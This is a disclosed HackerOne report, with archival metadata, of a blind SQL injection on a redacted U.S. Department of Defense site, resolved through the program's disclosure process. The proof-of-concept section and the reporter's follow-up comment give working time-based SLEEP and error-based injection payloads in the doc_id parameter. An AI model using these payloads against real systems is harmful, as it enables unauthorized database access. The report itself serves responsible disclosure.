---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2019-10-04
submitted: 2019-01-30T20:38:01.764Z
bounty_usd: null
votes: 23
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "sp1d3rs"
source: "https://hackerone.com/reports/488795"
title: "SQL injection on the https://████/"
---
# SQL injection on the https://████/

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 23 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-04

- Report: [https://hackerone.com/reports/488795](https://hackerone.com/reports/488795)
- CWE: SQL Injection
- Submitted: 2019-01-30T20:38:01.764Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Description
Hello. I was able to find Blind SQL injection on the https://███/
Database appears to be MySQL 5.

##POC
```
GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1
Host: ██████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: _ga=GA1.2.1697249984.1548431559


```
By issuing sleep(0) response will be delayed to 0 seconds.
By issuing sleep(1) response will be delayed to 5 seconds.
By issuing sleep(2) response will be delayed to 10 seconds.
By issuing sleep(5) response will be delayed to 25 seconds.

As POC, I retrieved count of databases (3). No other information was accessed (such as tables or data):


Apparently, SQL statement is executing 5 times on the database side, because response time always 5 times bigger than supplied sleep value.

## Impact

SQL injection usually have high-critical impact.

## Timeline

- **Report Filed**
- **2019-01-30** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2019-01-30** @sp1d3rs: Currently DB hangs and can timeout queries. 
If POC above won't be reproducible due to the request timeout, here is error-based tests:
1) https://███/library.php?path=test&doc_id=1%20or1 (error in the query - missing space after `or` )
```
HTTP/1.1 500 Internal Server Error
Date: Wed, 30 Jan 2019 20:39:26 GMT
Server: Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.26 OpenSSL/1.0.1f
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Content-Length: 92
Connection: close
Content-Type: text/html;charset=UTF-8

<html><body><b>Error 500: Internal Server Error</b><br>doc_id 1 or1 not found.</body></html>
```
2) https://█████/library.php?path=test&doc_id=1%20or%201=2 (request hang)

For some reason it worked some time ago without hang, and I was able to retrieve data.
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
